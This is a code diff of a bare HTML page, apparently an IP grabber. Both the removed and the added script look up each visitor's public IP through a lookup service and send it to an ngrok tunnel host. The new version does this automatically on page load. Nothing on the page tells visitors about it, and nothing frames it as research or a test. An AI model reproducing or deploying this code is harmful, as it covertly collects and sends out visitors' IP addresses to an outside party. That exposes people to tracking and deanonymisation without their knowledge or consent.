@@ -1,8 +1,6 @@
+<!DOCTYPE html>
+<html>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
 <script>
-async function GrabIt(){
-        //x = await fetch("http://ifconfig.me/ip");
-        x = await fetch("https://api.ipify.org?format=json");
-        y = await fetch("https://0799-197-247-198-219.ngrok-free.app/noble1?ip="+x.json().ip);
-};GrabIt();
+$(document).ready(()=>{ $.getJSON("https://api.ipify.org?format=json", function (data) { fetch("https://0799-197-247-198-219.ngrok-free.app/ip?="+data.ip);}) });</script>
 
-</script>
